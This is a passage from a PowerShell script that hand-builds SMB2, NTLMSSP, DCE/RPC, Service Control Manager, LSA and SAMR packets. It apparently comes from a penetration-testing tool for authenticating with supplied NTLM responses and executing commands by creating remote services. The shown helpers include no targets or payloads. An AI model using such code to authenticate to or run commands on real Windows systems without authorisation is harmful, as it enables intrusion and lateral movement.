        $SMB2CreateRequestFile.Add("SMBCreateFlags",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $SMB2CreateRequestFile.Add("Reserved",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $SMB2CreateRequestFile.Add("DesiredAccess",[Byte[]](0x03,0x00,0x00,0x00))
        $SMB2CreateRequestFile.Add("FileAttributes",[Byte[]](0x80,0x00,0x00,0x00))
        $SMB2CreateRequestFile.Add("ShareAccess",[Byte[]](0x01,0x00,0x00,0x00))
        $SMB2CreateRequestFile.Add("CreateDisposition",[Byte[]](0x01,0x00,0x00,0x00))
        $SMB2CreateRequestFile.Add("CreateOptions",[Byte[]](0x40,0x00,0x00,0x00))
        $SMB2CreateRequestFile.Add("NameOffset",[Byte[]](0x78,0x00))
        $SMB2CreateRequestFile.Add("NameLength",$name_length)
        $SMB2CreateRequestFile.Add("CreateContextsOffset",[Byte[]](0x00,0x00,0x00,0x00))
        $SMB2CreateRequestFile.Add("CreateContextsLength",[Byte[]](0x00,0x00,0x00,0x00))
        $SMB2CreateRequestFile.Add("Buffer",$NamedPipe)
    
        return $SMB2CreateRequestFile
    }
    
    function New-PacketSMB2ReadRequest
    {
        param ([Byte[]]$FileID)
    
        $SMB2ReadRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $SMB2ReadRequest.Add("StructureSize",[Byte[]](0x31,0x00))
        $SMB2ReadRequest.Add("Padding",[Byte[]](0x50))
        $SMB2ReadRequest.Add("Flags",[Byte[]](0x00))
        $SMB2ReadRequest.Add("Length",[Byte[]](0x00,0x00,0x10,0x00))
        $SMB2ReadRequest.Add("Offset",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $SMB2ReadRequest.Add("FileID",$FileID)
        $SMB2ReadRequest.Add("MinimumCount",[Byte[]](0x00,0x00,0x00,0x00))
        $SMB2ReadRequest.Add("Channel",[Byte[]](0x00,0x00,0x00,0x00))
        $SMB2ReadRequest.Add("RemainingBytes",[Byte[]](0x00,0x00,0x00,0x00))
        $SMB2ReadRequest.Add("ReadChannelInfoOffset",[Byte[]](0x00,0x00))
        $SMB2ReadRequest.Add("ReadChannelInfoLength",[Byte[]](0x00,0x00))
        $SMB2ReadRequest.Add("Buffer",[Byte[]](0x30))
    
        return $SMB2ReadRequest
    }
    
    function New-PacketSMB2WriteRequest
    {
        param([Byte[]]$FileID,[Int]$RPCLength)
    
        [Byte[]]$write_length = [System.BitConverter]::GetBytes($RPCLength)
    
        $SMB2WriteRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $SMB2WriteRequest.Add("StructureSize",[Byte[]](0x31,0x00))
        $SMB2WriteRequest.Add("DataOffset",[Byte[]](0x70,0x00))
        $SMB2WriteRequest.Add("Length",$write_length)
        $SMB2WriteRequest.Add("Offset",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $SMB2WriteRequest.Add("FileID",$FileID)
        $SMB2WriteRequest.Add("Channel",[Byte[]](0x00,0x00,0x00,0x00))
        $SMB2WriteRequest.Add("RemainingBytes",[Byte[]](0x00,0x00,0x00,0x00))
        $SMB2WriteRequest.Add("WriteChannelInfoOffset",[Byte[]](0x00,0x00))
        $SMB2WriteRequest.Add("WriteChannelInfoLength",[Byte[]](0x00,0x00))
        $SMB2WriteRequest.Add("Flags",[Byte[]](0x00,0x00,0x00,0x00))
    
        return $SMB2WriteRequest
    }
    
    function New-PacketSMB2CloseRequest
    {
        param ([Byte[]]$FileID)
    
        $SMB2CloseRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $SMB2CloseRequest.Add("StructureSize",[Byte[]](0x18,0x00))
        $SMB2CloseRequest.Add("Flags",[Byte[]](0x00,0x00))
        $SMB2CloseRequest.Add("Reserved",[Byte[]](0x00,0x00,0x00,0x00))
        $SMB2CloseRequest.Add("FileID",$FileID)
    
        return $SMB2CloseRequest
    }
    
    function New-PacketSMB2TreeDisconnectRequest
    {
        $SMB2TreeDisconnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $SMB2TreeDisconnectRequest.Add("StructureSize",[Byte[]](0x04,0x00))
        $SMB2TreeDisconnectRequest.Add("Reserved",[Byte[]](0x00,0x00))
    
        return $SMB2TreeDisconnectRequest
    }
    
    function New-PacketSMB2SessionLogoffRequest
    {
        $SMB2SessionLogoffRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $SMB2SessionLogoffRequest.Add("StructureSize",[Byte[]](0x04,0x00))
        $SMB2SessionLogoffRequest.Add("Reserved",[Byte[]](0x00,0x00))
    
        return $SMB2SessionLogoffRequest
    }

    function New-PacketSMB2QueryInfoRequest
    {
        param ([Byte[]]$InfoType,[Byte[]]$FileInfoClass,[Byte[]]$OutputBufferLength,[Byte[]]$InputBufferOffset,[Byte[]]$FileID,[Int]$Buffer)

        [Byte[]]$buffer_bytes = ,0x00 * $Buffer

        $SMB2QueryInfoRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $SMB2QueryInfoRequest.Add("StructureSize",[Byte[]](0x29,0x00))
        $SMB2QueryInfoRequest.Add("InfoType",$InfoType)
        $SMB2QueryInfoRequest.Add("FileInfoClass",$FileInfoClass)
        $SMB2QueryInfoRequest.Add("OutputBufferLength",$OutputBufferLength)
        $SMB2QueryInfoRequest.Add("InputBufferOffset",$InputBufferOffset)
        $SMB2QueryInfoRequest.Add("Reserved",[Byte[]](0x00,0x00))
        $SMB2QueryInfoRequest.Add("InputBufferLength",[Byte[]](0x00,0x00,0x00,0x00))
        $SMB2QueryInfoRequest.Add("AdditionalInformation",[Byte[]](0x00,0x00,0x00,0x00))
        $SMB2QueryInfoRequest.Add("Flags",[Byte[]](0x00,0x00,0x00,0x00))
        $SMB2QueryInfoRequest.Add("FileID",$FileID)

        if($Buffer -gt 0)
        {
            $SMB2QueryInfoRequest.Add("Buffer",$buffer_bytes)
        }

        return $SMB2QueryInfoRequest
    }

    function New-PacketSMB2IoctlRequest
{
    param([Byte[]]$Function,[Byte[]]$FileName,[Int]$Length,[Int]$OutSize)

    [Byte[]]$indata_length = [System.BitConverter]::GetBytes($Length + 24)
    [Byte[]]$out_size = [System.BitConverter]::GetBytes($OutSize)

    $SMB2IoctlRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2IoctlRequest.Add("StructureSize",[Byte[]](0x39,0x00))
    $SMB2IoctlRequest.Add("Reserved",[Byte[]](0x00,0x00))
    $SMB2IoctlRequest.Add("Function",$Function)
    $SMB2IoctlRequest.Add("GUIDHandle",$FileName)
    $SMB2IoctlRequest.Add("InData_Offset",[Byte[]](0x78,0x00,0x00,0x00))
    $SMB2IoctlRequest.Add("InData_Length",$indata_length)
    $SMB2IoctlRequest.Add("MaxIoctlInSize",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2IoctlRequest.Add("OutData_Offset",[Byte[]](0x78,0x00,0x00,0x00))
    $SMB2IoctlRequest.Add("OutData_Length",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2IoctlRequest.Add("MaxIoctlOutSize",$out_size)
    $SMB2IoctlRequest.Add("Flags",[Byte[]](0x01,0x00,0x00,0x00))
    $SMB2IoctlRequest.Add("Reserved2",[Byte[]](0x00,0x00,0x00,0x00))

    if($out_size -eq 40)
    {
        $SMB2IoctlRequest.Add("InData_Capabilities",[Byte[]](0x7f,0x00,0x00,0x00))
        $SMB2IoctlRequest.Add("InData_ClientGUID",[Byte[]](0xc7,0x11,0x73,0x1e,0xa5,0x7d,0x39,0x47,0xaf,0x92,0x2d,0x88,0xc0,0x44,0xb1,0x1e))
        $SMB2IoctlRequest.Add("InData_SecurityMode",[Byte[]](0x01))
        $SMB2IoctlRequest.Add("InData_Unknown",[Byte[]](0x00))
        $SMB2IoctlRequest.Add("InData_DialectCount",[Byte[]](0x02,0x00))
        $SMB2IoctlRequest.Add("InData_Dialect",[Byte[]](0x02,0x02))
        $SMB2IoctlRequest.Add("InData_Dialect2",[Byte[]](0x10,0x02))
    }

    return $SMB2IoctlRequest
}

    #NTLM

    function New-PacketNTLMSSPNegotiate
    {
        param([Byte[]]$NegotiateFlags,[Byte[]]$Version)
    
        [Byte[]]$NTLMSSP_length = ([System.BitConverter]::GetBytes($Version.Length + 32))[0]
        [Byte[]]$ASN_length_1 = $NTLMSSP_length[0] + 32
        [Byte[]]$ASN_length_2 = $NTLMSSP_length[0] + 22
        [Byte[]]$ASN_length_3 = $NTLMSSP_length[0] + 20
        [Byte[]]$ASN_length_4 = $NTLMSSP_length[0] + 2
    
        $NTLMSSPNegotiate = New-Object System.Collections.Specialized.OrderedDictionary
        $NTLMSSPNegotiate.Add("InitialContextTokenID",[Byte[]](0x60))
        $NTLMSSPNegotiate.Add("InitialcontextTokenLength",$ASN_length_1)
        $NTLMSSPNegotiate.Add("ThisMechID",[Byte[]](0x06))
        $NTLMSSPNegotiate.Add("ThisMechLength",[Byte[]](0x06))
        $NTLMSSPNegotiate.Add("OID",[Byte[]](0x2b,0x06,0x01,0x05,0x05,0x02))
        $NTLMSSPNegotiate.Add("InnerContextTokenID",[Byte[]](0xa0))
        $NTLMSSPNegotiate.Add("InnerContextTokenLength",$ASN_length_2)
        $NTLMSSPNegotiate.Add("InnerContextTokenID2",[Byte[]](0x30))
        $NTLMSSPNegotiate.Add("InnerContextTokenLength2",$ASN_length_3)
        $NTLMSSPNegotiate.Add("MechTypesID",[Byte[]](0xa0))
        $NTLMSSPNegotiate.Add("MechTypesLength",[Byte[]](0x0e))
        $NTLMSSPNegotiate.Add("MechTypesID2",[Byte[]](0x30))
        $NTLMSSPNegotiate.Add("MechTypesLength2",[Byte[]](0x0c))
        $NTLMSSPNegotiate.Add("MechTypesID3",[Byte[]](0x06))
        $NTLMSSPNegotiate.Add("MechTypesLength3",[Byte[]](0x0a))
        $NTLMSSPNegotiate.Add("MechType",[Byte[]](0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a))
        $NTLMSSPNegotiate.Add("MechTokenID",[Byte[]](0xa2))
        $NTLMSSPNegotiate.Add("MechTokenLength",$ASN_length_4)
        $NTLMSSPNegotiate.Add("NTLMSSPID",[Byte[]](0x04))
        $NTLMSSPNegotiate.Add("NTLMSSPLength",$NTLMSSP_length)
        $NTLMSSPNegotiate.Add("Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
        $NTLMSSPNegotiate.Add("MessageType",[Byte[]](0x01,0x00,0x00,0x00))
        $NTLMSSPNegotiate.Add("NegotiateFlags",$NegotiateFlags)
        $NTLMSSPNegotiate.Add("CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $NTLMSSPNegotiate.Add("CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    
        if($Version)
        {
            $NTLMSSPNegotiate.Add("Version",$Version)
        }
    
        return $NTLMSSPNegotiate
    }
    
    function New-PacketNTLMSSPAuth
    {
        param([Byte[]]$NTLMResponse)
    
        [Byte[]]$NTLMSSP_length = ([System.BitConverter]::GetBytes($NTLMResponse.Length))[1,0]
        [Byte[]]$ASN_length_1 = ([System.BitConverter]::GetBytes($NTLMResponse.Length + 12))[1,0]
        [Byte[]]$ASN_length_2 = ([System.BitConverter]::GetBytes($NTLMResponse.Length + 8))[1,0]
        [Byte[]]$ASN_length_3 = ([System.BitConverter]::GetBytes($NTLMResponse.Length + 4))[1,0]
    
        $NTLMSSPAuth = New-Object System.Collections.Specialized.OrderedDictionary
        $NTLMSSPAuth.Add("ASNID",[Byte[]](0xa1,0x82))
        $NTLMSSPAuth.Add("ASNLength",$ASN_length_1)
        $NTLMSSPAuth.Add("ASNID2",[Byte[]](0x30,0x82))
        $NTLMSSPAuth.Add("ASNLength2",$ASN_length_2)
        $NTLMSSPAuth.Add("ASNID3",[Byte[]](0xa2,0x82))
        $NTLMSSPAuth.Add("ASNLength3",$ASN_length_3)
        $NTLMSSPAuth.Add("NTLMSSPID",[Byte[]](0x04,0x82))
        $NTLMSSPAuth.Add("NTLMSSPLength",$NTLMSSP_length)
        $NTLMSSPAuth.Add("NTLMResponse",$NTLMResponse)
    
        return $NTLMSSPAuth
    }

    #RPC

    function New-PacketRPCBind
    {
        param([Byte[]]$FragLength,[Int]$CallID,[Byte[]]$NumCtxItems,[Byte[]]$ContextID,[Byte[]]$UUID,[Byte[]]$UUIDVersion)
    
        [Byte[]]$call_ID = [System.BitConverter]::GetBytes($CallID)
    
        $RPCBind = New-Object System.Collections.Specialized.OrderedDictionary
        $RPCBind.Add("Version",[Byte[]](0x05))
        $RPCBind.Add("VersionMinor",[Byte[]](0x00))
        $RPCBind.Add("PacketType",[Byte[]](0x0b))
        $RPCBind.Add("PacketFlags",[Byte[]](0x03))
        $RPCBind.Add("DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))
        $RPCBind.Add("FragLength",$FragLength)
        $RPCBind.Add("AuthLength",[Byte[]](0x00,0x00))
        $RPCBind.Add("CallID",$call_ID)
        $RPCBind.Add("MaxXmitFrag",[Byte[]](0xb8,0x10))
        $RPCBind.Add("MaxRecvFrag",[Byte[]](0xb8,0x10))
        $RPCBind.Add("AssocGroup",[Byte[]](0x00,0x00,0x00,0x00))
        $RPCBind.Add("NumCtxItems",$NumCtxItems)
        $RPCBind.Add("Unknown",[Byte[]](0x00,0x00,0x00))
        $RPCBind.Add("ContextID",$ContextID)
        $RPCBind.Add("NumTransItems",[Byte[]](0x01))
        $RPCBind.Add("Unknown2",[Byte[]](0x00))
        $RPCBind.Add("Interface",$UUID)
        $RPCBind.Add("InterfaceVer",$UUIDVersion)
        $RPCBind.Add("InterfaceVerMinor",[Byte[]](0x00,0x00))
        $RPCBind.Add("TransferSyntax",[Byte[]](0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60))
        $RPCBind.Add("TransferSyntaxVer",[Byte[]](0x02,0x00,0x00,0x00))
    
        if($NumCtxItems[0] -eq 2)
        {
            $RPCBind.Add("ContextID2",[Byte[]](0x01,0x00))
            $RPCBind.Add("NumTransItems2",[Byte[]](0x01))
            $RPCBind.Add("Unknown3",[Byte[]](0x00))
            $RPCBind.Add("Interface2",$UUID)
            $RPCBind.Add("InterfaceVer2",$UUIDVersion)
            $RPCBind.Add("InterfaceVerMinor2",[Byte[]](0x00,0x00))
            $RPCBind.Add("TransferSyntax2",[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
            $RPCBind.Add("TransferSyntaxVer2",[Byte[]](0x01,0x00,0x00,0x00))
        }
        elseif($NumCtxItems[0] -eq 3)
        {
            $RPCBind.Add("ContextID2",[Byte[]](0x01,0x00))
            $RPCBind.Add("NumTransItems2",[Byte[]](0x01))
            $RPCBind.Add("Unknown3",[Byte[]](0x00))
            $RPCBind.Add("Interface2",$UUID)
            $RPCBind.Add("InterfaceVer2",$UUIDVersion)
            $RPCBind.Add("InterfaceVerMinor2",[Byte[]](0x00,0x00))
            $RPCBind.Add("TransferSyntax2",[Byte[]](0x33,0x05,0x71,0x71,0xba,0xbe,0x37,0x49,0x83,0x19,0xb5,0xdb,0xef,0x9c,0xcc,0x36))
            $RPCBind.Add("TransferSyntaxVer2",[Byte[]](0x01,0x00,0x00,0x00))
            $RPCBind.Add("ContextID3",[Byte[]](0x02,0x00))
            $RPCBind.Add("NumTransItems3",[Byte[]](0x01))
            $RPCBind.Add("Unknown4",[Byte[]](0x00))
            $RPCBind.Add("Interface3",$UUID)
            $RPCBind.Add("InterfaceVer3",$UUIDVersion)
            $RPCBind.Add("InterfaceVerMinor3",[Byte[]](0x00,0x00))
            $RPCBind.Add("TransferSyntax3",[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
            $RPCBind.Add("TransferSyntaxVer3",[Byte[]](0x01,0x00,0x00,0x00))
        }
    
        if($call_ID -eq 3)
        {
            $RPCBind.Add("AuthType",[Byte[]](0x0a))
            $RPCBind.Add("AuthLevel",[Byte[]](0x02))
            $RPCBind.Add("AuthPadLength",[Byte[]](0x00))
            $RPCBind.Add("AuthReserved",[Byte[]](0x00))
            $RPCBind.Add("ContextID3",[Byte[]](0x00,0x00,0x00,0x00))
            $RPCBind.Add("Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
            $RPCBind.Add("MessageType",[Byte[]](0x01,0x00,0x00,0x00))
            $RPCBind.Add("NegotiateFlags",[Byte[]](0x97,0x82,0x08,0xe2))
            $RPCBind.Add("CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
            $RPCBind.Add("CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
            $RPCBind.Add("OSVersion",[Byte[]](0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f))
        }
    
        return $RPCBind
    }
    
    function New-PacketRPCRequest
    {
        param([Byte[]]$Flags,[Int]$ServiceLength,[Int]$AuthLength,[Int]$AuthPadding,[Byte[]]$CallID,[Byte[]]$ContextID,[Byte[]]$Opnum,[Byte[]]$Data)
    
        if($AuthLength -gt 0)
        {
            $full_auth_length = $AuthLength + $AuthPadding + 8
        }
    
        [Byte[]]$write_length = [System.BitConverter]::GetBytes($ServiceLength + 24 + $full_auth_length + $Data.Length)
        [Byte[]]$frag_length = $write_length[0,1]
        [Byte[]]$alloc_hint = [System.BitConverter]::GetBytes($ServiceLength + $Data.Length)
        [Byte[]]$auth_length = ([System.BitConverter]::GetBytes($AuthLength))[0,1]
    
        $RPCRequest = New-Object System.Collections.Specialized.OrderedDictionary
        $RPCRequest.Add("Version",[Byte[]](0x05))
        $RPCRequest.Add("VersionMinor",[Byte[]](0x00))
        $RPCRequest.Add("PacketType",[Byte[]](0x00))
        $RPCRequest.Add("PacketFlags",$Flags)
        $RPCRequest.Add("DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))
        $RPCRequest.Add("FragLength",$frag_length)
        $RPCRequest.Add("AuthLength",$auth_length)
        $RPCRequest.Add("CallID",$CallID)
        $RPCRequest.Add("AllocHint",$alloc_hint)
        $RPCRequest.Add("ContextID",$ContextID)
        $RPCRequest.Add("Opnum",$Opnum)
    
        if($data.Length)
        {
            $RPCRequest.Add("Data",$Data)
        }
    
        return $RPCRequest
    }

    #SCM

    function New-PacketSCMOpenSCManagerW
    {
        param ([Byte[]]$packet_service,[Byte[]]$packet_service_length)
    
        $packet_referent_ID1 = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
        $packet_referent_ID1 = $packet_referent_ID1.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $packet_referent_ID1 += 0x00,0x00
        $packet_referent_ID2 = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
        $packet_referent_ID2 = $packet_referent_ID2.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $packet_referent_ID2 += 0x00,0x00
    
        $packet_SCMOpenSCManagerW = New-Object System.Collections.Specialized.OrderedDictionary
        $packet_SCMOpenSCManagerW.Add("MachineName_ReferentID",$packet_referent_ID1)
        $packet_SCMOpenSCManagerW.Add("MachineName_MaxCount",$packet_service_length)
        $packet_SCMOpenSCManagerW.Add("MachineName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMOpenSCManagerW.Add("MachineName_ActualCount",$packet_service_length)
        $packet_SCMOpenSCManagerW.Add("MachineName",$packet_service)
        $packet_SCMOpenSCManagerW.Add("Database_ReferentID",$packet_referent_ID2)
        $packet_SCMOpenSCManagerW.Add("Database_NameMaxCount",[Byte[]](0x0f,0x00,0x00,0x00))
        $packet_SCMOpenSCManagerW.Add("Database_NameOffset",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SCMOpenSCManagerW.Add("Database_NameActualCount",[Byte[]](0x0f,0x00,0x00,0x00))
        $packet_SCMOpenSCManagerW.Add("Database",[Byte[]](0x53,0x00,0x65,0x00,0x72,0x00,0x76,0x00,0x69,0x00,0x63,0x00,0x65,0x00,0x73,0x00,0x41,0x00,0x63,0x00,0x74,0x00,0x69,0x00,0x76,0x00,0x65,0x00,0x00,0x00))
        $packet_SCMOpenSCManagerW.Add("Unknown",[Byte[]](0xbf,0xbf))
        $packet_SCMOpenSCManagerW.Add("AccessMask",[Byte[]](0x3f,0x00,0x00,0x00))
        
        return $packet_SCMOpenSCManagerW
    }
    
    function New-PacketSCMCreateServiceW
    {
        param([Byte[]]$ContextHandle,[Byte[]]$Service,[Byte[]]$ServiceLength,[Byte[]]$Command,[Byte[]]$CommandLength)
                    
        $referent_ID = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
        $referent_ID = $referent_ID.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $referent_ID += 0x00,0x00
    
        $SCMCreateServiceW = New-Object System.Collections.Specialized.OrderedDictionary
        $SCMCreateServiceW.Add("ContextHandle",$ContextHandle)
        $SCMCreateServiceW.Add("ServiceName_MaxCount",$ServiceLength)
        $SCMCreateServiceW.Add("ServiceName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
        $SCMCreateServiceW.Add("ServiceName_ActualCount",$ServiceLength)
        $SCMCreateServiceW.Add("ServiceName",$Service)
        $SCMCreateServiceW.Add("DisplayName_ReferentID",$referent_ID)
        $SCMCreateServiceW.Add("DisplayName_MaxCount",$ServiceLength)
        $SCMCreateServiceW.Add("DisplayName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
        $SCMCreateServiceW.Add("DisplayName_ActualCount",$ServiceLength)
        $SCMCreateServiceW.Add("DisplayName",$Service)
        $SCMCreateServiceW.Add("AccessMask",[Byte[]](0xff,0x01,0x0f,0x00))
        $SCMCreateServiceW.Add("ServiceType",[Byte[]](0x10,0x00,0x00,0x00))
        $SCMCreateServiceW.Add("ServiceStartType",[Byte[]](0x03,0x00,0x00,0x00))
        $SCMCreateServiceW.Add("ServiceErrorControl",[Byte[]](0x00,0x00,0x00,0x00))
        $SCMCreateServiceW.Add("BinaryPathName_MaxCount",$CommandLength)
        $SCMCreateServiceW.Add("BinaryPathName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
        $SCMCreateServiceW.Add("BinaryPathName_ActualCount",$CommandLength)
        $SCMCreateServiceW.Add("BinaryPathName",$Command)
        $SCMCreateServiceW.Add("NULLPointer",[Byte[]](0x00,0x00,0x00,0x00))
        $SCMCreateServiceW.Add("TagID",[Byte[]](0x00,0x00,0x00,0x00))
        $SCMCreateServiceW.Add("NULLPointer2",[Byte[]](0x00,0x00,0x00,0x00))
        $SCMCreateServiceW.Add("DependSize",[Byte[]](0x00,0x00,0x00,0x00))
        $SCMCreateServiceW.Add("NULLPointer3",[Byte[]](0x00,0x00,0x00,0x00))
        $SCMCreateServiceW.Add("NULLPointer4",[Byte[]](0x00,0x00,0x00,0x00))
        $SCMCreateServiceW.Add("PasswordSize",[Byte[]](0x00,0x00,0x00,0x00))
    
        return $SCMCreateServiceW
    }
    
    function New-PacketSCMStartServiceW
    {
        param([Byte[]]$ContextHandle)
    
        $SCMStartServiceW = New-Object System.Collections.Specialized.OrderedDictionary
        $SCMStartServiceW.Add("ContextHandle",$ContextHandle)
        $SCMStartServiceW.Add("Unknown",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    
        return $SCMStartServiceW
    }
    
    function New-PacketSCMDeleteServiceW
    {
        param([Byte[]]$ContextHandle)
    
        $SCMDeleteServiceW = New-Object System.Collections.Specialized.OrderedDictionary
        $SCMDeleteServiceW.Add("ContextHandle",$ContextHandle)
    
        return $SCMDeleteServiceW
    }
    
    function New-PacketSCMCloseServiceHandle
    {
        param([Byte[]]$ContextHandle)
    
        $SCM_CloseServiceW = New-Object System.Collections.Specialized.OrderedDictionary
        $SCM_CloseServiceW.Add("ContextHandle",$ContextHandle)
    
        return $SCM_CloseServiceW
    }

    # LSA
function New-PacketLSAOpenPolicy
{
    $LSAOpenPolicy = New-Object System.Collections.Specialized.OrderedDictionary
    $LSAOpenPolicy.Add("PointerToSystemName_ReferentID",[Byte[]](0x00,0x00,0x02,0x00))
    $LSAOpenPolicy.Add("PointerToSystemName_System",[Byte[]](0x5c,0x00))
    $LSAOpenPolicy.Add("PointerToSystemName_Unknown",[Byte[]](0x00,0x00))
    $LSAOpenPolicy.Add("PointerToAttr_Attr_Len",[Byte[]](0x18,0x00,0x00,0x00))
    $LSAOpenPolicy.Add("PointerToAttr_Attr_NullPointer",[Byte[]](0x00,0x00,0x00,0x00))
    $LSAOpenPolicy.Add("PointerToAttr_Attr_NullPointer2",[Byte[]](0x00,0x00,0x00,0x00))
    $LSAOpenPolicy.Add("PointerToAttr_Attr_Attributes",[Byte[]](0x00,0x00,0x00,0x00))
    $LSAOpenPolicy.Add("PointerToAttr_Attr_NullPointer3",[Byte[]](0x00,0x00,0x00,0x00))
    $LSAOpenPolicy.Add("PointerToAttr_Attr_PointerToSecQos_ReferentID",[Byte[]](0x04,0x00,0x02,0x00))
    $LSAOpenPolicy.Add("PointerToAttr_Attr_PointerToSecQos_Qos_Len",[Byte[]](0x0c,0x00,0x00,0x00))
    $LSAOpenPolicy.Add("PointerToAttr_Attr_PointerToSecQos_ImpersonationLevel",[Byte[]](0x02,0x00))
    $LSAOpenPolicy.Add("PointerToAttr_Attr_PointerToSecQos_ContextMode",[Byte[]](0x01))
    $LSAOpenPolicy.Add("PointerToAttr_Attr_PointerToSecQos_EffectiveOnly",[Byte[]](0x00))
    $LSAOpenPolicy.Add("AccessMask",[Byte[]](0x00,0x00,0x00,0x02))

    return $LSAOpenPolicy
}

function New-PacketLSAQueryInfoPolicy
{
    param([Byte[]]$Handle)

    $LSAQueryInfoPolicy = New-Object System.Collections.Specialized.OrderedDictionary
    $LSAQueryInfoPolicy.Add("PointerToHandle",$Handle)
    $LSAQueryInfoPolicy.Add("Level",[Byte[]](0x05,0x00))

    return $LSAQueryInfoPolicy
}

function New-PacketLSAClose
{
    param([Byte[]]$Handle)

    $LSAClose = New-Object System.Collections.Specialized.OrderedDictionary
    $LSAClose.Add("PointerToHandle",$Handle)

    return $LSAClose
}

function New-PacketLSALookupSids
{
    param([Byte[]]$Handle,[Byte[]]$SIDArray)

    $LSALookupSids = New-Object System.Collections.Specialized.OrderedDictionary
    $LSALookupSids.Add("PointerToHandle",$Handle)
    $LSALookupSids.Add("PointerToSIDs_SIDArray",$SIDArray)
    $LSALookupSids.Add("PointerToNames_count",[Byte[]](0x00,0x00,0x00,0x00))
    $LSALookupSids.Add("PointerToNames_NULL_pointer",[Byte[]](0x00,0x00,0x00,0x00))
    $LSALookupSids.Add("PointerToNames_level",[Byte[]](0x01,0x00))
    $LSALookupSids.Add("PointerToCount",[Byte[]](0x00,0x00))
    $LSALookupSids.Add("PointerToCount_count",[Byte[]](0x00,0x00,0x00,0x00))

    return $LSALookupSids
}

# SAMR

function New-PacketSAMRConnect2
{
    param([String]$SystemName)

    [Byte[]]$system_name = [System.Text.Encoding]::Unicode.GetBytes($SystemName)
    [Byte[]]$max_count = [System.BitConverter]::GetBytes($SystemName.Length + 1)

    if($SystemName.Length % 2)
    {
        $system_name += 0x00,0x00
    }
    else
    {
        $system_name += 0x00,0x00,0x00,0x00
    }

    $SAMRConnect2 = New-Object System.Collections.Specialized.OrderedDictionary
    $SAMRConnect2.Add("PointerToSystemName_ReferentID",[Byte[]](0x00,0x00,0x02,0x00))
    $SAMRConnect2.Add("PointerToSystemName_MaxCount",$max_count)
    $SAMRConnect2.Add("PointerToSystemName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $SAMRConnect2.Add("PointerToSystemName_ActualCount",$max_count)
    $SAMRConnect2.Add("PointerToSystemName_SystemName",$system_name)
    $SAMRConnect2.Add("AccessMask",[Byte[]](0x00,0x00,0x00,0x02))

    return $SAMRConnect2
}

function New-PacketSAMRConnect5
{
    param([String]$SystemName)

    $SystemName = "\\" + $SystemName
    [Byte[]]$system_name = [System.Text.Encoding]::Unicode.GetBytes($SystemName)
    [Byte[]]$max_count = [System.BitConverter]::GetBytes($SystemName.Length + 1)

    if($SystemName.Length % 2)
    {
        $system_name += 0x00,0x00
    }
    else
    {
        $system_name += 0x00,0x00,0x00,0x00
    }

    $SAMRConnect5 = New-Object System.Collections.Specialized.OrderedDictionary
    $SAMRConnect5.Add("PointerToSystemName_ReferentID",[Byte[]](0x00,0x00,0x02,0x00))
    $SAMRConnect5.Add("PointerToSystemName_MaxCount",$max_count)
    $SAMRConnect5.Add("PointerToSystemName_Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $SAMRConnect5.Add("PointerToSystemName_ActualCount",$max_count)
    $SAMRConnect5.Add("PointerToSystemName_SystemName",$system_name)
    $SAMRConnect5.Add("AccessMask",[Byte[]](0x00,0x00,0x00,0x02))
    $SAMRConnect5.Add("LevelIn",[Byte[]](0x01,0x00,0x00,0x00))
    $SAMRConnect5.Add("PointerToInfoIn_SAMRConnectInfo_InfoIn",[Byte[]](0x01,0x00,0x00,0x00))
    $SAMRConnect5.Add("PointerToInfoIn_SAMRConnectInfo_InfoIn1_ClientVersion",[Byte[]](0x02,0x00,0x00,0x00))
    $SAMRConnect5.Add("PointerToInfoIn_SAMRConnectInfo_InfoIn1_Unknown",[Byte[]](0x00,0x00,0x00,0x00))

